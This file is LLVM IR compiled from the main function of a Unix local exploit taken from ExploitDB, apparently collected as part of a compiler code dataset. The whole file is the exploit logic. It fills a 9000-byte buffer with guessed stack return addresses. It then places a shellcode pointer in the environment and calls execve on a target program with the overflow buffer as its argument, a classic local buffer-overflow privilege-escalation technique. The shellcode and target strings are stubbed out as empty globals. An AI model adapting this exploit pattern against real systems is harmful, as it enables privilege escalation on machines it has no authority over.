; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22923.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22923.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@FUN = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [7 x i8] c"execve\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [9000 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [2 x i8*], align 16
  %10 = alloca [24 x i8*], align 16
  %11 = alloca i64, align 8
  %12 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i8*, i8** @shellcode, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = sub i32 -1073741830, %14
  %16 = load i8*, i8** @FUN, align 8
  %17 = call i32 @strlen(i8* %16)
  %18 = sub i32 %15, %17
  %19 = zext i32 %18 to i64
  store i64 %19, i64* %11, align 8
  %20 = getelementptr inbounds [9000 x i8], [9000 x i8]* %6, i64 0, i64 0
  %21 = bitcast i8* %20 to i32*
  store i32* %21, i32** %12, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 2
  br i1 %23, label %24, label %27

24:                                               ; preds = %2
  %25 = call i32 (...) @usage()
  %26 = call i32 @exit(i32 0) #3
  unreachable

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %8, align 4
  %32 = load i32, i32* %8, align 4
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %34, label %48

34:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %35

35:                                               ; preds = %44, %34
  %36 = load i32, i32* %7, align 4
  %37 = icmp slt i32 %36, 9000
  br i1 %37, label %38, label %47

38:                                               ; preds = %35
  %39 = load i64, i64* %11, align 8
  %40 = add i64 %39, 1
  %41 = trunc i64 %40 to i32
  %42 = load i32*, i32** %12, align 8
  %43 = getelementptr inbounds i32, i32* %42, i32 1
  store i32* %43, i32** %12, align 8
  store i32 %41, i32* %42, align 4
  br label %44

44:                                               ; preds = %38
  %45 = load i32, i32* %7, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %7, align 4
  br label %35

47:                                               ; preds = %35
  br label %48

48:                                               ; preds = %47, %27
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, 1
  br i1 %50, label %51, label %62

51:                                               ; preds = %48
  store i32 0, i32* %7, align 4
  br label %52

52:                                               ; preds = %58, %51
  %53 = load i32, i32* %7, align 4
  %54 = icmp slt i32 %53, 3500
  br i1 %54, label %55, label %61

55:                                               ; preds = %52
  %56 = load i32*, i32** %12, align 8
  %57 = getelementptr inbounds i32, i32* %56, i32 1
  store i32* %57, i32** %12, align 8
  store i32 -1077936568, i32* %56, align 4
  br label %58

58:                                               ; preds = %55
  %59 = load i32, i32* %7, align 4
  %60 = add nsw i32 %59, 4
  store i32 %60, i32* %7, align 4
  br label %52

61:                                               ; preds = %52
  br label %62

62:                                               ; preds = %61, %48
  %63 = load i8*, i8** @shellcode, align 8
  %64 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  store i8* %63, i8** %64, align 16
  %65 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 1
  store i8* null, i8** %65, align 8
  %66 = load i8*, i8** @FUN, align 8
  %67 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  store i8* %66, i8** %67, align 16
  %68 = getelementptr inbounds [9000 x i8], [9000 x i8]* %6, i64 0, i64 0
  %69 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 1
  store i8* %68, i8** %69, align 8
  %70 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 2
  store i8* null, i8** %70, align 16
  %71 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  %72 = load i8*, i8** %71, align 16
  %73 = getelementptr inbounds [24 x i8*], [24 x i8*]* %10, i64 0, i64 0
  %74 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  %75 = call i32 @execve(i8* %72, i8** %73, i8** %74)
  %76 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @usage(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

declare dso_local i32 @perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
